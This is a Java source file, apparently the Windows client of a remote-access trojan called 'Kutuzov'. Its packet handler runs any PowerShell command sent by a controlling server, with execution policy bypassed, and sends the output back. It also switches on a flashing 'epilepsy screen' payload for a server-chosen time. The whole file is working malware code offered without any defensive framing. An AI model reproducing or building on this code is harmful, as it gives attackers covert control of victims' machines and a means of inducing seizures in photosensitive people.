package me.kutuzov.client;

import com.profesorfalken.jpowershell.PowerShell;
import me.kutuzov.client.payloads.Payloads;
import me.kutuzov.packet.CSPowershellResponsePacket;
import me.kutuzov.packet.Packet;
import me.kutuzov.packet.SCEpilepsyPacket;
import me.kutuzov.packet.SCPowershellCommandPacket;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class KutuzovWinPackets {
    private static PowerShell powerShell;
    public static void init() { powerShell = PowerShell.openSession(); }
    public static PowerShell getPowerShell() { return powerShell; }

    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCPowershellCommandPacket) {
            new Thread(() -> {
                SCPowershellCommandPacket p = (SCPowershellCommandPacket)packet;
                System.out.println("[S->C] " + p.getClass().getSimpleName() + ": " + p.command);
                String command = p.command;
                String result = "";

                String fullCommand = "powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";
                Process powerShellProcess = null;
                try {
                    powerShellProcess = Runtime.getRuntime().exec(fullCommand);
                    powerShellProcess.getOutputStream().close();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(powerShellProcess.getInputStream()));
                    powerShellProcess.waitFor();
                    String line;
                    while ((line = reader.readLine()) != null)
                        result += line + "\n";
                    reader.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }

                System.out.println("[C->S] CSPowershellResponsePacket init: " + result);
                try {
                    oos.writeObject(new CSPowershellResponsePacket(result));
                    System.out.println("[C->S] CSPowershellResponsePacket sent");
                } catch (Exception e) { e.printStackTrace(); }
            }).start();
        } else if(packet instanceof SCEpilepsyPacket) {
            new Thread(() -> {
                SCEpilepsyPacket scEpilepsyPacket = (SCEpilepsyPacket) packet;
                Payloads.epilepsyScreenEnabled.set(true);
                try {
                    Thread.sleep(scEpilepsyPacket.time);
                } catch (InterruptedException e) {}
                Payloads.epilepsyScreenEnabled.set(false);
            }).start();
        }
    }
}